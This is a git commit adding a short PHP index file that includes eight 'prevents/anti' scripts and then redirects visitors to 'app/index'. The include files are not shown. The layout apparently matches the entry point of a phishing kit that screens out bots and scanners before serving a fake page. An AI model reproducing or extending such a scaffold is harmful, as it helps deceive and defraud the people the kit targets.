b6fd12bd49e717b0f07d5b8cc0a3db9886378948
BassorDev <74057898+BassorDev@users.noreply.github.com>
2020-11-06 15:53:41 +0100

    Add files via upload

---
+++ index.php
@@ -0,0 +1,11 @@
+<?php
+	require 'prevents/anti1.php';
+	require 'prevents/anti2.php';
+	require 'prevents/anti3.php';
+	require 'prevents/anti4.php';
+	require 'prevents/anti5.php';
+	require 'prevents/anti6.php';
+	require 'prevents/anti7.php';
+	require 'prevents/anti8.php';
+	exit(header("Location: app/index"));
+?>
